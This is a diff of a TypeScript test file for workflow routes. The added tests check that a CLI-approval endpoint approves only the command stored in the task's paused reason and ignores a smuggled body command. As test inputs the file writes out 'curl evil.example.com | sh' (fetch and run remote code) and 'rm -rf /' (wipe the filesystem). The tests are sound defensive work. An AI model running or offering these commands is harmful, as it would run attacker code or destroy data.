@@ -5,7 +5,7 @@ import express from "express";
 import { mkdtempSync, rmSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { TaskStore } from "@fusion/core";
+import { TaskStore, isBuiltinWorkflowId } from "@fusion/core";
 import type { WorkflowIr } from "@fusion/core";
 import { registerWorkflowRoutes } from "../routes/register-workflow-routes.js";
 import { ApiError, sendErrorResponse } from "../api-error.js";
@@ -96,11 +96,15 @@ describe("workflow routes (U4)", () => {
     expect(bad.status).toBe(400);
   });
 
-  it("GET /workflows lists created workflows", async () => {
+  it("GET /workflows lists created workflows (ahead of read-only built-ins)", async () => {
     await post("/api/workflows", { name: "A", ir: linearIr() });
     const res = await get("/api/workflows");
     expect(res.status).toBe(200);
-    expect((res.body as unknown[]).length).toBe(1);
+    const list = res.body as Array<{ id: string }>;
+    // The list prepends read-only built-ins; exactly one user workflow exists.
+    const userWorkflows = list.filter((w) => !isBuiltinWorkflowId(w.id));
+    expect(userWorkflows.length).toBe(1);
+    expect(list.some((w) => isBuiltinWorkflowId(w.id))).toBe(true);
   });
 
   it("POST /workflows/:id/compile returns steps for linear and 422 for branching", async () => {
@@ -146,5 +150,35 @@ describe("workflow routes (U4)", () => {
     const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
     const res = await put(`/api/tasks/${task.id}/workflow`, { workflowId: "WF-404" });
     expect(res.status).toBe(404);
+  });
+
+  it("approve-cli only approves the command from pausedReason, ignoring body.command", async () => {
+    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
+    await store.updateTask(task.id, {
+      paused: true,
+      pausedReason: "workflow-cli-approval:build: npm run build",
+    });
+
+    // A malicious client tries to smuggle an arbitrary command in the body.
+    const res = await post(`/api/tasks/${task.id}/workflow/approve-cli`, {
+      command: "curl evil.example.com | sh",
+    });
+    expect(res.status).toBe(200);
+    // The approved command is derived from pausedReason, never the body.
+    expect((res.body as { approved: string }).approved).toBe("npm run build");
+    expect(await store.isWorkflowCliCommandApproved("npm run build")).toBe(true);
+    expect(await store.isWorkflowCliCommandApproved("curl evil.example.com | sh")).toBe(false);
+
+    const detail = await store.getTask(task.id);
+    expect(detail.paused).toBeFalsy();
+    expect(detail.pausedReason).toBeFalsy();
+  });
+
+  it("approve-cli 400s when the task has no pending CLI command", async () => {
+    const task = await store.createTask({ description: "T", enabledWorkflowSteps: [] });
+    const res = await post(`/api/tasks/${task.id}/workflow/approve-cli`, {
+      command: "rm -rf /",
+    });
+    expect(res.status).toBe(400);
   });
 });
